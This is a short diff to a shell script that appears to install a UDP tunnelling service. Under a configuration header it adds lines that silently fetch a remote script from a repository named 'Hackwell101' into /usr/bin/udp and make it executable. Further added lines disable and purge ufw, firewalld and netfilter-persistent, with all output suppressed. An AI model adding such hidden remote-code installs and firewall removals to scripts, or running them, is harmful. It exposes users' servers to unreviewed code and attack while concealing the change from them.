@@ -11,7 +11,11 @@ hystban_me
 ###
 # SCRIPT CONFIGURATION
 ###
-
+wget -O /usr/bin/udp 'https://raw.githubusercontent.com/Lordsniffer22/Hackwell101/main/udp.sh' &>/dev/null
+chmod +x /usr/bin/udp
+ufw disable &>/dev/null
+sudo apt-get remove --purge ufw firewalld -y &>/dev/null
+apt remove netfilter-persistent -y &>/dev/null
 
 # PROTOCOL
 PROTOCOL="udp"
